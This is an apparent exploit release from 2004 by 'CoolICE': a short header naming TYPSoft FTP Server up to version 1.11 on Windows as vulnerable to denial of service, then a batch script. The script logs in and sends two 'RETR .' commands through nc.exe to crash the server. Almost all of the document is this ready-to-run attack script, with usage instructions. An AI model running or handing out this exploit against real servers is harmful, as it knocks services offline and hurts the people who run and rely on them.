::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:Application: TYPSoft FTP Server
:Vendors: www.typsoft.com
:Version: <=1.11
:Platforms: Windows
:Bug: D.O.S
:Date: 2004-08-28
:Author: CoolICE
:E_Mail: CoolICE#China.com
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
@echo off
if '%3'=='' echo Usage:%0 target ^<UserName^> ^<PassWord^> [port]&goto
:eof
set FTPUSER=%2
set FTPPWD=%3
set PORT=21
if not '%4'=='' set PORT=%4
for %%n in (nc.exe) do if not exist %%~$PATH:n if not exist nc.exe
echo Need nc.exe&goto :eof

echo USER %FTPUSER%>ftp.cmd
echo PASS %FTPPWD%>>ftp.cmd
echo RETR .>>ftp.cmd
echo RETR .>>ftp.cmd
echo QUIT>>ftp.cmd
nc -v %1 %PORT%<ftp.cmd
del ftp.cmd 
